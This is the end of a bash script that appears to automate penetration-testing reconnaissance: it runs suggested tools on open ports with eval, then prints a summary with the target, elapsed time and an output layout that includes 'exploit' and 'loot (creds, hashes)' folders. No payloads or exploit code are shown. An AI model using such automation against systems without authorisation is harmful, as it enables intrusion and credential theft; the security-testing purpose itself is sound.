                eval "$uc" 2>&1 | tee "$log"
                
                echo -e "\n${GRN}[+] $tool done${NC}"
                echo -e "${GRN}    saved: $log${NC}"
            else
                echo -e "${YEL}skip${NC}"
            fi
        done <<< "$sugg"
        
        # show what to do next based on the service
        show_next_steps "$p" "$svc"
        
        echo ""
        
    done < "$OUTDIR/scans/ports.txt"
}

summary() {
    echo -e "\n${BLU}===== SUMMARY =====${NC}\n"
    
    end=$(date +%s)
    elapsed=$((end - start_time))
    
    # make the time look nice
    if [ $elapsed -gt 3600 ]; then
        h=$((elapsed / 3600))
        m=$(((elapsed % 3600) / 60))
        s=$(((elapsed % 3600) % 60))
        time="${h}h ${m}m ${s}s"
    elif [ $elapsed -gt 60 ]; then
        m=$((elapsed / 60))
        s=$((elapsed % 60))
        time="${m}m ${s}s"
    else
        time="${elapsed}s"
    fi
    
    echo -e "${YEL}target:${NC} $TARGET"
    echo -e "${YEL}os:${NC} ${os:-unknown}"
    echo -e "${YEL}type:${NC} $SCAN_TYPE"
    echo -e "${YEL}time:${NC} $time\n"
    
    echo -e "${GRN}output structure:${NC}"
    echo -e "  $OUTDIR/"
    echo -e "  ├── scans/      (nmap, tool outputs)"
    echo -e "  ├── exploit/    (exploits go here)"
    echo -e "  ├── loot/       (creds, hashes)"
    echo -e "  ├── report/     (vulns, findings)"
    echo -e "  └── screenshots/ (web screenshots)\n"
    
    scans=$(ls -1 "$OUTDIR/scans" 2>/dev/null | wc -l)
    echo -e "${GRN}scan files: $scans${NC}\n"
    
    if [ -f "$OUTDIR/scans/ports.txt" ]; then
        pc=$(wc -l < "$OUTDIR/scans/ports.txt")
        echo -e "${GRN}ports: $pc open${NC}\n"
    fi
    
    if [ -f "$OUTDIR/report/vulns.txt" ]; then
        echo -e "${RED}vulns found (check report/vulns.txt):${NC}"
        cat "$OUTDIR/report/vulns.txt"
        echo ""
    fi
    
    if [[ ${#MISSING[@]} -gt 0 ]]; then
        echo -e "${YEL}missing tools:${NC}"
        printf '  %s\n' "${MISSING[@]}"
        echo ""
    fi
    
    echo -e "${GRN}done${NC}\n"
}

main() {
    banner
    check_deps
    get_target
    setup_scan
    run_scan
    parse_results
    run_tools
    summary
}

main
